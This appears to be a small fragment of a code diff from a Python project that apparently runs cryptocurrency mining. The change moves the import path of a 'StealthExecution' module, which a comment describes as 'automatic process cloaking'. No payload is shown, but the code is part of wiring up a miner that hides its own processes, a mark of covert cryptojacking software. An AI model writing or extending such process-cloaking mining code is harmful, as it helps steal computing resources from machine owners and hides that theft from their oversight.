@@ -18,7 +18,7 @@ import subprocess
 
 # ✅ STEALTH INTEGRATION: Import stealth execution for automatic process cloaking
 try:
-    from mining_environment.cpu_plugins.cloaking.stealth_exec import StealthExecution
+    from mining_environment.stealth.plugins.stealth_exec import StealthExecution
     _stealth_system = None
     _stealth_logger = logging.getLogger('mining_performance_stealth')
 except ImportError:
